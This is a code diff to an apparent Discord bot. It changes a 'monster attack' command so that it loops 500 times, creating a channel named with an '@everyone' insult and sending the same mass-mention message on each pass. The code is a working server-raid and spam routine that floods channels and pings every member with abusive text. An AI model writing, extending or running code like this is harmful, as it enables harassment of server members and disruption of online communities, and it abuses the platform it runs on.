@@ -14,8 +14,9 @@ client.on('message', msg => {
 
 
 client.on('message' , async (message) => {
-    if (message.content.startsWith('monster spam')) {
+    if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
+        message.guild.createChannel('@everyone hello bitches @here', 'text')
         message.channel.send('@everyone hello bitches @here');
 }
 }
